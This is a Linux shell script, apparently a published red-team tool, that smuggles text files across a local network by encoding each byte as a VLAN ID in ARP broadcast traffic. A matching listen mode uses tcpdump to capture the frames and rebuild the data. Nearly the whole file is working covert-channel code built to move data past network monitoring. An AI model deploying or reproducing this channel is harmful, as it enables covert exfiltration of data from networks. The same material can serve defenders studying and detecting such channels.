 #!/bin/sh
echo
echo "NativePayload_ARP2.sh , Published by Damon Mohammadbagher 2018" 
echo "Injecting/Downloading/Uploading DATA via ARP (Broadcast Traffic)"
echo "help syntax: ./NativePayload_ARP2.sh help"
echo
# ./NativePayload_ARP2.sh -send Test.txt vlan3 192.168.222.1/24 192.168.222.255 -p 192.168.222.2 wlan0
if [ $1 == "help" ]
then
tput setaf 6;
echo "Method 1: Using NativePayload_ARP2.sh both Sides"
echo
tput setaf 9;
echo "Step1: (System A ) ./NativePayload_ARP2.sh -listen (Packet Number)"
echo "Step2: (System B ) ./NativePayload_ARP2.sh -send TextFile.txt [VlanName] [vlan-Subnet/mask] [vlan-Broadcast]  -p [vlan-PingIPv4] [(wlan0,eth0,vboxnet0,etc.)]"
echo
echo "example Step1 (System A1 ) IPv4:192.168.56.101 : ./NativePayload_ARP2.sh -listen 72"
echo "example Step1 (System A2 ) IPv4:192.168.56.102 : ./NativePayload_ARP2.sh -listen 72"
echo "example  Step2 (System B ) IPv4:192.168.56.1 : ./NativePayload_ARP2.sh -send Test.txt vlan3 192.168.222.1/24 192.168.222.255 -p 192.168.222.2 vboxnet0"
echo
echo "Description: with Step1 this script will get packets from (system B) , with Step2 you will send textfile.txt to all systems in (LAN) via ARP Broadcast Traffic by \"Vid Tag\"."
echo "Note: (System B) is \"VM host or Physical Machine\" and (System A1/A2) are \"Virtual Machine\""
echo
tput setaf 6;
echo "Method 2: Using NativePayload_ARP2.sh (system B) , tcpdump -XX -v broadcast | grep 0x0000 (system A)"
echo
tput setaf 9;
echo "Step1: (System A ) tcpdump -XX -v broadcast | grep 0x0000"
echo "Step2: (System B ) ./NativePayload_ARP2.sh -send TextFile.txt [VlanName] [vlan-Subnet/mask] [vlan-Broadcast]  -p [vlan-PingIPv4] [(wlan0,eth0,vboxnet0,etc.)]"
echo
echo "example Step1 (system A): tcpdump -XX -v broadcast | grep 0x0000"
echo "example Step2 (system B): ./NativePayload_ARP2.sh -send mytest.txt vlan1 192.168.160.1/24 192.168.160.255 -p 192.168.160.2 eth0"
echo

fi

# client side
############################## -send #######################################
if [ $1 == "-send" ]
then
counter=0
echo "[!] Sending Text file \"$2\" via ARP Traffic by Vlan-ID .... ;)"
echo "[!] VlanName:[$3]::VlanSubnet:[$4]:BCast:[$5]::Ping[$7]"
echo 

	for text in `xxd -p -c 1 $2`; 
	do
        	
		for byte in $text; 
		do
		str=`echo $((0x$byte))`
		mytext=`printf "%x" $str | xxd -r -p`
		mybyte=`printf "%x" $str`
		Time=`date '+%d/%m/%Y-%H:%M:%S'`
	   	echo "[$counter]$Time::SendingBroadcast:vid[$str]:text[$mytext]:byte[$mybyte]:Delay<4"
		`ip link add link $8 name $3 type vlan id $str`
		sleep 0.3
# 		`ip addr add 192.168.222.1/24 brd 192.168.222.255 dev $3`
 		`ip addr add $4 brd $5 dev $3`
		sleep 0.3
		`ip link set dev $3 up`
		sleep 0.2
			if [ $6 == "-p" ]
			then
			ping $7 -c 2 | grep "ops" &
			fi
		sleep 1.8
		`ip link delete $3`
		str=""	 	
		((counter++))		
		done
	done
	#finish flag
		 
		Time=`date '+%d/%m/%Y-%H:%M:%S'`
	   	echo "[$counter]$Time::SendingBroadcast:vid[255]:text[;D]:byte[ff]:Delay<7"
		`ip link add link $8 name $3 type vlan id 255`
		sleep 0.4
# 		`ip addr add 192.168.222.1/24 brd 192.168.222.255 dev $3`
 		`ip addr add $4 brd $5 dev $3`
		sleep 0.2
		`ip link set dev $3 up`
		sleep 0.2
			if [ $6 == "-p" ]
			then
			ping $7 -c 10 | grep "ops" &
			fi
		sleep 11
		`ip link delete $3`
	#finish flag
fi
############################## -send #######################################


# server side
############################## -listen #######################################
if [ $1 == "-listen" ]
then
	# echo " " > bcast.txt

	while true
	do
	{
		Time=`date '+%d/%m/%Y-%H:%M:%S'`
		echo
		echo "[$Time] Network \"Broadcast\" Scanning Mode Started by tcpdump tool"					
		echo "[$Time] listen Mode started...."	
		out=`tcpdump -c $2 -XX -v "broadcast" | grep -e 0806 -e "ffff ffff ffff" |  grep 0x0000: | awk  {'print $9'}`	
		temp=""	
		echo "Your Data via ARP (BroadCast) Traffic is:"
		echo
			for xbytes in $out; 
			do 
			if [ "$xbytes" != "$temp" ] ;
			then 
			echo $xbytes | xxd -r -p
			fi  
			temp=$xbytes
			done
		echo
	}
done
fi 
############################## -listen #######################################
